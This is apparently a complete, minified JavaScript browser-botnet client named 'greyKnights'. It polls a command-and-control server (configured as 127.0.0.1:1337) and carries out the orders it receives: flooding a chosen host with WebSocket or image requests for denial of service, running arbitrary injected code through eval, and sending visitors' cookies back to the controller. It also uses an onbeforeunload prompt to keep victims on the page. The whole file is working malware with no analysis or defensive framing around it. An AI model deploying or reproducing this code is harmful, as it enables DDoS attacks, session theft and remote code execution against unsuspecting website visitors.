function init(){return window.greyKnights?!1:(window.greyKnights=!0,window.greyKnights=Math.random().toString(36).substr(2,9),botId=window.greyKnights,console.log(botId,": bot loaded"),function a(){window.setTimeout(function(){console.log("get req"),execCommand(requestCommands(botId)),a()},config.timer)}(),window.onbeforeunload=finBot,window.requestCommands=requestCommands,void(window.execCommand=execCommand))}function dos(a){if(a.prot.startsWith("ws")){for(var b=(new Array,0);b<a.numRequests;b++){var c=a.prot+"://"+a.host+":"+a.port+"/?"+b;if("WebSocket"in window)ws[b]=new WebSocket(c);else{if(!("MozWebSocket"in window))return!1;ws[b]=new MozWebSocket(c)}}return!0}for(var b=0;b<a.numRequests;b++){var d=new Image,e=a.prot+"://"+a.host+":"+a.port+"/?"+b;d.src=e}return!0}function getCookies(){return console.log("cookies: ",document.cookie),document.cookie}function injectJs(cmd){return eval(cmd),!0}function killClient(){console.log("die die die")}function requestCommands(a){return httpJSONGet(config.cCenter+config.getPath+a)}function sendResults(a){a={results:a},console.log("Send Results: ",a),httpPost(config.cCenter+config.putPath+botId,a)}function httpJSONGet(a){var b=new XMLHttpRequest;return b.open("GET",a,!1),b.send(null),JSON.parse(b.responseText)}function httpPost(a,b){var c=new XMLHttpRequest;return c.open("POST",a,!0),c.setRequestHeader("Content-type","application/json"),c.send(JSON.stringify(b)),c.responseText}function execCommand(a){if(console.log("command: ",a),a)for(var b in a){console.log(b);var c=a[b];switch(b){case"DOS":for(var d in c)dos(c[d]),console.log("DOS",c[d]);break;case"injectJs":injectJs(c);break;case"killClient":killClient();break;case"getCookies":console.log("Get cookies"),sendResults(getCookies());case"srvScann":default:return}}}function finBot(){return"Press wait till this page closses properly."}var config={cCenter:"http://127.0.0.1:1337",putPath:"/commands/put/",getPath:"/commands/get/",timer:3e3},botId;init();
